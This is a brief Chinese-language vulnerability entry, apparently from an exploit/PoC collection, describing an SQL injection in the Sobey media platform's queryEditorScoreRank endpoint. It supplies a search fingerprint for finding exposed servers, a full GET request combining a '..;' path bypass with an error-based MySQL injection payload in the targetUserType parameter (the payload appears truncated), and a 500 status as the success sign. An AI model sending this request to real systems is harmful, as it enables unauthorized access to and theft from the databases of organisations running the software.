# 索贝融媒体queryEditorScoreRank存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`GET /sobey-mchEditor/js/..;/mch/jztEditorScore/queryEditorScoreRank?siteCode=&targetUserType=('(SELECT 0x6c674774 FROM DUAL WHERE 8991=8991 AND GTID_SUBSET(CONCAT(0x7e,(SELECT(ELT(7958=7958,1)))),user`
- **响应特征**：500